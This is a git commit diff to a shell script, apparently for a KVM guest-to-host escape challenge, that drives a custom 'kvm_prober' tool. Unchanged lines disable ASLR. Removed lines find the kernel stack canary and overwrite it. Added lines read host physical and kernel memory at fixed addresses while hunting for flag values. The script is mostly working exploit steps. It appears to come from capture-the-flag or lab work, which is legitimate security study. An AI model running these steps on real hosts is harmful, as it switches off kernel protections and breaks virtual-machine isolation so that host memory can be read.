503d87dd06cc82d2cf459d5ab903052977e548ae
nickharrison2002000 <33985331+nickharrison2002000@users.noreply.github.com>
2025-11-04 05:05:28 -0700

    Update runme.sh

--- runme.sh
+++ runme.sh
@@ -30,7 +30,7 @@ KERN_VER=$(uname -r)
 
 ### ===Install basic build tools===
 apt update -y >/dev/null
-apt install sudo git make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
+apt install sudo git make gcc gdb tar -y >/dev/null || true
 apt install -f -y >/dev/null
 
 #sleep 2
@@ -57,18 +57,6 @@ echo "[*] Installing necessary headers..."
 dpkg -i *.deb || true
 
 sleep 2
-echo "[*] installing header packages..."
-apt-get install linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y 
-apt-get install linux-headers-6.1.0-21-image -y
-apt-get build-dep linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y
-apt-get build-dep linux-headers-6.1.0-21-image -y
-
-sleep 2
-echo "[*] installing any missing packages..."
-apt install -f -y >/dev/null
-apt-get --fix-broken install
-
-sleep 2
 echo "[*] getting kvm_prober setup..."
 make
 make install
@@ -88,26 +76,6 @@ sleep 2
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 sleep 5
-# Find address of stack guard canary
-CANARY_ADDR=$(nm /root/vmlinux | grep __stack_chk_guard | awk '{print "0x"$1}')
-echo $CANARY_ADDR
-
-sleep 5
-# Disable stack canary protection by zeroing it out
-echo "kvm_prober readkvmem $CANARY_ADDR 64"
-kvm_prober readkvmem $CANARY_ADDR 64
-
-sleep 5
-# Disable stack canary protection by zeroing it out
-echo "kvm_prober writekvmem $CANARY_ADDR AAAAAAAAAA"
-kvm_prober writekvmem $CANARY_ADDR 41414141414141414141
-
-sleep 5
-# Check if stack canary protection is zeros
-echo "kvm_prober readkvmem $CANARY_ADDR 64"
-kvm_prober readkvmem $CANARY_ADDR 64
-
-sleep 5
 echo "[*] Write flags default value"
 echo "deadbeef41424344"
 echo "with little endian: 44434241efbeadde"
@@ -116,44 +84,44 @@ echo "[*] Checking potential addresses for flags"
 
 # Scanning MMIO regions
 echo "[+] Scanning MMIO region 0x02A27968"
-kvm_prober readmmio_buf 0x02A27968 64
+kvm_prober readhostphys 0x02A27968 64
 sleep 5
 
 echo "[+] Scanning MMIO region 0x0275ef50"
-kvm_prober readmmio_buf 0x0275ef50 64
+kvm_prober readhostphys 0x0275ef50 64
 sleep 5
 
 echo "[+] Scanning MMIO region 0x02b5ee10"
-kvm_prober readmmio_buf 0x02b5ee10 64
+kvm_prober readhostphys 0x02b5ee10 64
 sleep 5
 
 echo "[+] Scanning MMIO region 0x026279a8"
-kvm_prober readmmio_buf 0x026279a8 64
+kvm_prober readhostphys 0x026279a8 64
 sleep 5
 
 echo "[+] Scanning MMIO region 0x64279a8"
-kvm_prober readmmio_buf 0x64279a8 64
+kvm_prober readhostphys 0x64279a8 64
 sleep 5
 
 echo "[+] Scanning MMIO region 0x695ee10"
-kvm_prober readmmio_buf 0x695ee10 64
+kvm_prober readhostphys 0x695ee10 64
 sleep 5
 
 # Scanning kernel memory
 echo "[+] Scanning kernel memory 0xffffffff826279a8"
-kvm_prober readkvmem 0xffffffff826279a8 64
+kvm_prober readhostmem 0xffffffff826279a8 64
 sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff82b5ee10"
-kvm_prober readkvmem 0xffffffff82b5ee10 64
+kvm_prober readhostmem 0xffffffff82b5ee10 64
 sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff82A27968"
-kvm_prober readkvmem 0xffffffff82A27968 64
+kvm_prober readhostmem 0xffffffff82A27968 64
 sleep 5
 
 echo "[+] Scanning kernel memory 0xffffffff8275ef50"
-kvm_prober readkvmem 0xffffffff8275ef50 64
+kvm_prober readhostmem 0xffffffff8275ef50 64
 
 sleep 5
 
